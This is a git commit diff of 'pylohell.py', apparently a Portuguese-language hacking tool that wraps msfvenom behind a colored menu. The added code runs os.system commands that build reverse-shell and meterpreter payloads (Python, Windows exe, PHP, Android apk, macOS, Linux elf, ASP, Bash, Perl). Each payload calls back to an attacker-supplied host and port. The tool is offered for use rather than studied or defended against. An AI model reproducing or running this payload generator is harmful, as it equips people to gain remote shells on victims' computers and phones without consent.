7113db29dcb814646522b0b098a312258ce0f23b
Will-0x1 <33598026+Will-0x1@users.noreply.github.com>
2017-11-12 13:54:11 -0300

    Update pylohell.py

--- pylohell.py
+++ pylohell.py
@@ -1,5 +1,6 @@
 import function
 import sys
+import os
 
 print("""
 \033[32m██████╗ ██╗   ██╗██╗      ██████╗ \033[0;0m\033[31m██╗  ██╗███████╗██╗     ██╗     \033[0;0m     
@@ -10,21 +11,21 @@ print("""
 """)
 function.Argumentos()
 
-pr = str(input("Escolha Uma Opção: "))  
+pr = str(input("\033[32mEscolha Uma Opção >> \033[0;0m"))  
 if pr == str('-pyl'):
-	print("""Selecione Qual Exploit Deseja Utilizar
+	print("""\033[31m     Selecione Qual Exploit Deseja Utilizar
 	 MsfVenom - Exploit 	use/exploit/msf
-	 Web-Delivery - Exploit use/exploit/web
 		""")
-	pr2 = str(input("pylohell>> "))
+	pr2 = str(input("\033[32mpylohell >> \033[0;0m"))
 else:
 	print("Exploit Não Econtrado")
 	sys.exit(0)
 
 if pr2 == str('use/exploit/msf'):
-	host  = str(input("Host: "))
-	port = int(input("LPORT: "))
-	print("""Payloads
+	host  = str(input("\033[32m-Host: \033[0;0m"))
+	port = str(input("\033[32m-Lport: \033[0;0m"))
+	print("""\033[31mPayloads
+		+---------------------+
 			1 - Python
 			2 - Windows
 			3 - Php
@@ -34,29 +35,45 @@ if pr2 == str('use/exploit/msf'):
 			7 - ASP
 			8 - Bash
 			9 - Perl
-		""")
-	pay = str(input("Payload: "))
-	print(pay)#FIMt(0)
-#Aqui tem o if
-
-
-
-
-
-#Fim Do IF
-if pr2 == str('use/exploit/web'):
-	host2  = str(input("Host: "))
-	port2 = int(input("LPORT: "))
-	print("""Payloads
-			1 - Python
-			2 - Windows
-			3 - Php
-		 """)
-	pay2 = str(input("Payload: "))
-	print(pay2)#FIM
-#Aqui tem o if
-
-
-
-
-#Fim Do if
+			10 - EXIT
+		+---------------------+
+		\033[0;0m""")
+	pay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(1):
+	cmd1 = os.system("msfvenom -p cmd/unix/reverse_python LHOST="+host+" LPORT="+port+" -f raw > shell.py")
+	print("\033[31mPayload criado com Sucesso!\033[0;0m")
+	pay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(2):
+	cmd1 = os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f exe > shell.exe")
+	print("\033[31mPayload criado com Sucesso!\033[0;0m")
+	pay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(3):
+	cmd1 = os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST="+host+" LPORT="+port+" -f raw > shell.php")
+	print("\033[31mPayload criado com Sucesso!\033[0;0m")
+	pay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(4):
+	cmd1 = os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" R > shell.apk")
+	print("\033[31mPayload criado com Sucesso!\033[0;0m")
+	pay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(5):
+	cmd1 = os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -f macho > shell.macho")
+	print("\033[31mPayload criado com Sucesso!\033[0;0m")
+	pay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(6):
+	cmd1 = os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f elf > shell.elf")
+	print("\033[31mPayload criado com Sucesso!\033[0;0m")
+	ppay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(7):
+	cmd1 = os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f asp > shell.asp")
+	print("\033[31mPayload criado com Sucesso!\033[0;0m")
+	pay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(8):
+	cmd1 = os.system("msfvenom -p cmd/unix/reverse_bash LHOST="+host+" LPORT="+port+" -f raw > shell.sh")
+	print("\033[31mPayload criado com Sucesso!\033[0;0m")
+	pay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(9):
+	cmd1 = os.system("msfvenom -p cmd/unix/reverse_perl LHOST="+host+" LPORT="+port+" -f raw > shell.pl")
+	print("\033[31mPayload criado com Sucesso!\033[0;0m")
+	pay = str(input("\033[32mPayload >> \033[0;0m"))
+if pay == str(10):
+	sys.exit(0)
